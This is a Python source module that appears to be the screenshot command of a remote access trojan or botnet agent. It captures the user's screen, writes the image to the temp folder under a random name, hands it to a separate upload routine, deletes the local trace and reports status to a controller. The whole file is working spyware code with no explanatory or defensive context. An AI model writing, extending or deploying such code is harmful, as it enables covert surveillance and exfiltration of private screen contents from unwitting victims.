import pyscreenshot as ImageGrab
import os
import base64
import string
import random
import requests
import utils

import upload


def run():
    try:
        image = ImageGrab.grab()
    except Exception as e:
        utils.send_output("Error while trying to create the screenshot: %s" % (e))
        return
        
    filename = ''.join(random.choice(string.ascii_letters) for _ in range(5))
    filename += ".jpg"
    filepath = os.path.join(os.environ['temp'], filename)
    image.save(filepath)
    upload.run(filepath)
    os.remove(filepath)


def help():
    help_text = """
Usage: screenshot
Captures screen.

"""
    return help_text
